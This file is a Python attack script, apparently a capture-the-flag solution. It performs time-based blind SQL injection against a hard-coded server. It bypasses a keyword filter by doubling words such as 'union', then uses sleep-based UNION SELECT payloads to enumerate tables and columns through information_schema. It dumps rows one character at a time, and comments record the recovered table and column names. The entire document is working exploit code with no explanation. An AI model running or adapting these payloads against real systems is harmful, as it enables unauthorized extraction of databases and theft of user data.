import requests
import urllib.parse
import string

base_url = 'http://34.92.193.147:30002/index.php?username='

def bypass_waf(query):
    query = query.replace('union', 'ununionion')
    query = query.replace('or', 'oorr')
    return query

def search(query):
    # Return True is query takes longer than 3 seconds

    query = bypass_waf(query)
    query = urllib.parse.quote_plus(query)
    r = requests.get(base_url + query)
    return r.elapsed.total_seconds() > 3

# Time Based Blind POC: print(search("' ununionion select (sleep(5)),2,3;-- -"))
# Search Primitive: ' ununionion select (if(2=2, sleep(5), 1)),2,3;-- -

def get_tables_length():
    for i in range(30):
        query = "' union select (if((select count(*) from information_schema.tables where table_schema not in('sys', 'mysql','information_schema','performance_schema'))=" + str(i) + ", sleep(5), 1)),2,3;-- -"
        res = search(query)
        if res:
            print('[*] Tables length: ' + str(i))
            return
    print('[!] Table length search failed')

searchspace = string.ascii_lowercase + string.ascii_uppercase + '0123456789$_'

def get_tables():
    for table_num in range(4): # We know there are 4 tables from get_tables_length
        table_name_length = None
        for i in range(30):
            query = "' union select (if((select length(table_name) from information_schema.tables where table_schema not in('sys', 'mysql','information_schema','performance_schema') limit " + str(table_num) + ",1)=" + str(i) + ", sleep(5), 1)),2,3;-- -"
            res = search(query)
            if res:
                table_name_length = i
                break
        if table_name_length == None:
            print('[!] Table name length search failed')
        # Found table_name_Length, now we need to find table_name_Length characters using substr
        curr_str = ''
        for i in range(1, table_name_length + 1):
            for c in searchspace:
                query = "' union select (if((select substr(table_name," + str(i) + ", 1) from information_schema.tables where table_schema not in('sys', 'mysql','information_schema','performance_schema') limit " + str(table_num) + ",1)='" + c + "', sleep(5), 1)),2,3;-- -"
                res = search(query)
                if res:
                    curr_str += c
                    break
        print('[*] Found table: ' + curr_str + ', length=' + str(table_name_length))

def get_table_columns(table_name):
    print('[*] Columns for table ' + table_name)
    num_columns = None
    for i in range(30):
        query = "' union select (if((select count(*) from information_schema.columns where table_name='" + table_name + "')=" + str(i) + ", sleep(5), 1)),2,3;-- -"
        res = search(query)
        if res:
            num_columns = i
    if num_columns == None:
        print('[!] Num column search failed')
    for column_num in range(num_columns): # Find name for each of the columns
        column_name_length = None
        for i in range(30):
            query = "' union select (if((select length(column_name) from information_schema.columns where table_name='" + table_name + "' limit " + str(column_num) + ",1)=" + str(i) + ", sleep(5), 1)),2,3;-- -"
            res = search(query)
            if res:
                column_name_length = i
                break
        if column_name_length == None:
            print('[!] Column name length search failed')
        # Found column_name_length, now we need to find column_name_length characters using substr
        curr_str = ''
        for i in range(1, column_name_length + 1):
            for c in searchspace:
                query = "' union select (if((select substr(column_name," + str(i) + ", 1) from information_schema.columns where table_name='" + table_name + "' limit " + str(column_num) + ",1)='" + c + "', sleep(5), 1)),2,3;-- -"
                res = search(query)
                if res:
                    curr_str += c
                    break
        print('[*] Found column: ' + curr_str + ', length=' + str(column_name_length))

def get_table_rows(table_name, table_columns):
    print('[*] Dumping ' + table_name)
    num_rows = None
    for i in range(300):
        query = "' union select (if((select count(*) from " + table_name + ")=" + str(i) + ", sleep(5), 1)),2,3;-- -"
        res = search(query)
        if res:
            num_rows = i
    if num_rows == None:
        print('[!] Num row search failed')
    print('[*] ' + str(num_rows) + ' rows')
    for row_num in range(num_rows):
        row_str = ''
        for column in table_columns:
            column_data_length = None
            for i in range(50):
                query = "' union select (if((select length(" + column + ") from " + table_name + " limit " + str(row_num) + ",1)=" + str(i) + ", sleep(5), 1)),2,3;-- -"
                res = search(query)
                if res:
                    column_data_length = i
                    break
            if column_data_length == None:
                print('[!] Column data length search failed')
            # Found column_data_length, now we need to find column_name_length characters using substr
            curr_str = ''
            for i in range(1, column_data_length + 1):
                for c in searchspace:
                    query = "' union select (if((select substr(" + column + "," + str(i) + ", 1) from " + table_name + " limit " + str(row_num) + ",1)='" + c + "', sleep(5), 1)),2,3;-- -"
                    res = search(query)
                    if res:
                        curr_str += c
                        break
            row_str += curr_str + '|'
        print('[*] ' + row_str)


#get_tables_length() => 4
#get_tables() => [4uth0rs, r3f3r3r5, u4g3nt5, u_n4m3]
#get_table_columns('4uth0rs') => ['id', 'first_name', 'last_name', 'email', 'birthdate', 'added']
#get_table_columns('r3f3r3r5') => ['id', 'referrer', 'ip_address']
#get_table_columns('u4g3nt5') => ['id', 'uagent', 'ip_address', 'username']
#get_table_columns('u_n4m3') => ['u_id', 'username', 'username']

get_table_rows('u_n4m3', ['u_id', 'username'])
